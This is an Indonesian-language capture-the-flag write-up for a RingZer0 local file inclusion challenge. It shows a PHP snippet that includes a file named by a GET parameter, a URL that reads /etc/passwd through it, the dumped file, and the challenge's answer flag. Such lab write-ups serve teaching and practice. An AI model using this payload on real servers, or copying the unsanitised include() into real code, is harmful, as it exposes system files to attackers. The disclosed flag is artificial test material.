<h1><b>Looking for password file</h1></b>
<pre>
http://challenges.ringzer0team.com:10075/?page=lorem.php
</pre>
</b><h3>Solution</h3></b>
<p align='justify'>Diberikan sebuah URL website <u>http://challenges.ringzer0team.com:10075/?page=lorem.php</u> yang sepertinya berupa challenge LFI (local file inclusion) yang mana
penyerang dapat melihat seluruh akses direktori dari sebuah halaman website dan yang lebih parah lagi melihat file sensitif seperti file passwd linux</p>
<p align='justify'>Pada URL kita tinggal mengganti lorem.php dengan /etc/passwd. yang otomatis browser membaca file tersebut, dan script php yang memungkinkan dari
kelemahan tersebut seperti dibawah ini</p>

```php
<?php 
$file = $_GET['page'];
if(isset($file))
{	
	include("$file");
}
else
{
	include("index.php");	
}
?>
```
<p>Perhatikan requests method GET dan include() disana terdapat kelemahan yang attacker dapat dengan mudah mengakses semua dirktori dan file target</p>
<u>http://challenges.ringzer0team.com:10075/?page=/etc/passwd</u>
<pre>
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:MailingListManager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:GnatsBug-ReportingSystem(admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:FLAG-zH9g1934v774Y7Zx5s16t5ym8Z:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
sshd:x:101:65534::/var/run/sshd:/usr/sbin/nologin
syslog:x:102:105::/home/syslog:/bin/false
</pre>
</b><h3>Flag</h3></b>
<pre>
FLAG-zH9g1934v774Y7Zx5s16t5ym8Z
</pre>
